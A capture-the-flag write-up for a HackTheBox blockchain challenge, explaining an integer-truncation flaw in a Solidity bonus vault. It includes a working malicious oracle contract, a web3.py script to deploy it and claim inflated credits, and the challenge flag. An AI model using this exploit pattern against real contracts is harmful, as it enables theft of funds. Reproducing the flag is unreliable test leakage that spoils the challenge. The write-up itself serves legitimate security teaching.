# The Claim That Broke The Oath

## Information

- **Difficulty**: Very Easy
- **Category**: Blockchain
- **Platform**: HackTheBox (Neurogrid CTF)
- **Date**: November 21, 2025
- **Points**: 850

## Challenge Description

When famine struck the river wards, the imperial vault promised fairness through a “claim rite” where anyone could request aid as long as their losses were approved by an assessor’s seal. The decree sounded righteous, combining math and mercy in one. But Satoshi, a quiet scribe from the docks, doubted the purity of its numbers. He spent nights studying the relief ledgers and the symbols that certified truth until he saw that the vault’s arithmetic did not balance. It bent in favor of those who already had plenty.

At dawn, he walked into the square carrying his own seal, one that should not exist, and submitted his claim. What followed was not a theft but a reckoning. The vault’s counting script faltered, the books split open, and the market floor filled with what it had hidden. The stewards called it heresy. The people called it proof.

By nightfall, the vault’s oath of “pure balance” was shattered. In its broken sums, Satoshi left a message no emperor could ignore: “Even the fairest claim can be written false.”

## Reconnaissance

### Source Code Analysis

We are provided with three Solidity files: `Setup.sol`, `BonusVaultETH.sol`, and `IOracleU.sol`.

The core logic is in `BonusVaultETH.sol`:

```solidity
contract BonusVaultETH {
    uint128 public constant MAX_BONUS = 100 ether;
    mapping(address => uint256) public credits;

    // ...

    function claimBonus(IOracleU oracle) external {
        uint256 delta = oracle.adjust(msg.sender);

        require(uint128(delta) <= MAX_BONUS, "cap");

        credits[msg.sender] += delta;
    }
    
    // ...
}
```

The `Setup.sol` contract defines the win condition:

```solidity
    function isSolved() external view returns (bool) {
        return vault.credits(player) > vault.MAX_BONUS();
    }
```

### Findings

1.  **Unsafe Casting**: In `claimBonus`, the `delta` returned by the oracle is a `uint256`.
2.  **Check Bypass**: The `require` statement checks `uint128(delta) <= MAX_BONUS`. This casts `delta` to `uint128` *before* comparison, truncating the higher bits.
3.  **State Update**: However, the line `credits[msg.sender] += delta;` uses the original `uint256` `delta`.
4.  **Exploit Path**: If we can provide an `oracle` that returns a value larger than `MAX_BONUS` but whose lower 128 bits are less than or equal to `MAX_BONUS`, we can bypass the check and increase our credits massively, satisfying `isSolved`.

## Exploitation

### Vulnerability Analysis

The vulnerability is a classic integer truncation issue. The check `uint128(delta)` only validates the lower 128 bits of the returned value. By setting the 129th bit (or higher) to 1, we can make `delta` extremely large while keeping `uint128(delta)` small.

For example, if we return `(1 << 128) + 100 ether`:
-   `uint128(delta)` becomes `100 ether` (which passes `<= 100 ether`).
-   The actual `delta` added to credits is `2^128 + 100 ether`, which is much larger than `MAX_BONUS`.

### Exploit Development

We create a malicious oracle contract implementing `IOracleU`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IOracleU {
    function adjust(address user) external view returns (uint256);
}

contract MaliciousOracle is IOracleU {
    function adjust(address user) external pure override returns (uint256) {
        // Return (1 << 128) + 100 ether
        // uint128(val) == 100 ether (Passes check)
        // val > 100 ether (Wins game)
        return (1 << 128) + 100 ether;
    }
}
```

We then deploy this contract and call `claimBonus` on the vault, passing our malicious oracle's address.

### Solution Script

```python
# ... (setup code) ...

# Deploy Malicious Oracle
MaliciousOracle = w3.eth.contract(abi=abi, bytecode=bytecode)
construct_txn = MaliciousOracle.constructor().build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 2000000,
    'gasPrice': w3.eth.gas_price
})
# ... (sign and send) ...

# Call claimBonus
vault_contract = w3.eth.contract(address=vault_address, abi=bonus_vault_abi)
claim_txn = vault_contract.functions.claimBonus(oracle_address).build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 2000000,
    'gasPrice': w3.eth.gas_price
})
# ... (sign and send) ...
```

### Flag

```
HTB{L0wB1t5_P4ss3d_H1ghBit5_Expl0d3d_14fa49f88e54010da8a12599a17013b4}
```
